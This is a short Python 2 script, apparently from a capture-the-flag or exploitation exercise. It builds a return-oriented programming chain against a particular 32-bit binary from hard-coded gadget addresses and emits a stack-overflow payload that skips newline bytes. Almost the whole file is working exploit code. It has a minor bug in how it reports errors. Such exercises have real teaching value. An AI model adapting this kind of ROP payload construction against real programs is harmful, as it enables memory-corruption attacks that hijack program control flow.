#! /usr/bin/python2
from sys import stdout, stderr

pop_eax = 0x080b054a  # pop eax; ret
pop_ebx = 0x080b2643  # pop ebx; ret;
plaintext = 0x80e6ce0  # Address
format_str = 0x80b40a4  # Address
xlatb = 0x0806c646  # xlatb; ret;  # mov al, BYTE PTR [ebx + al]
inc_eax = 0x08088a9e  # inc eax; ret;
pop_edx_ebx = 0x0805ebf9  # pop edx; pop ebx; ret;
eax_pe_edx = 0x08071393  # add eax, edx; ret;
dw_eax_edx = 0x080a36c8  # mov dword ptr [eax], edx; ret;
mov_ecx_eax = 0x08098db8  # mov ecx, eax; mov eax, ecx; ret;
fancy_dw_ebx_ecx = 0x08096c57  # mov dword ptr [ebx], ecx; add esp, 4; pop ebx; pop esi; ret;

stdout.write("Foo Bar Baz\x00\n")  # To be read into `plaintext`

# Note payload cannot contain ord("\n")

# Print the value of GLB using main.
dummy = [0x00000000] * 6

code = [

]

return_seq = [
    pop_eax,
    0x0,
    pop_ebx,
    plaintext,
    xlatb,

    inc_eax,

    mov_ecx_eax,
    fancy_dw_ebx_ecx,
    0x0,
    plaintext,
    0x0,

    pop_ebx,
    0x80e5000,  # $ebx at start of concatenate strings
    0x08049859,  # pop ebp; ret;
    0xffffd018,  # original ebp
    0x08049eb7,  # the return address to print plaintext
    0x08049eb7,  # the return address to print plaintext
]

payload = dummy + code + return_seq

#            &i   - &buffer
len_buffer = 0x28 - 0x1c

# Write our required return address and data to the stack
byte_mask = (0b1 << 8) - 1
i = 0
for word in payload:
    assert (word >> 32) == 0  # 4 byte address
    for j in range(4):
        byte = word & byte_mask
        if byte == ord("\n"):
            stderr("Cannot write 0x0a to the stack (i.e. a newline), change value number ", i)
        if not (i == len(payload) - 1 and j == 3):
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x00\x00\x00")
        else:
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x09\x00\x00")
        word >>= 8
    i += 1

stdout.flush()
